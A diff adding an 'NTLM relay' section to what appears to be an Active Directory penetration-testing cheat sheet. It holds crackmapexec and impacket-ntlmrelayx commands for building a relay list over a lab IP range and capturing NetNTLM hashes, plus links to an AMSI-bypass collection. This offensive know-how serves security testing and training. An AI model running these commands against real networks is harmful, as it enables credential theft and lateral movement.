@@ -702,6 +702,16 @@ Get-ChildItem \\domain.local\netlogon -Recurse -Include *.bat,*.cmd,*.vbs,*.ps1
 
 ```
 
+# 8. NTLM relay
+```powershell
+crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
+impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support 
+
+```
+
+
+
+
 ### Refrences
 * [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 * [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)
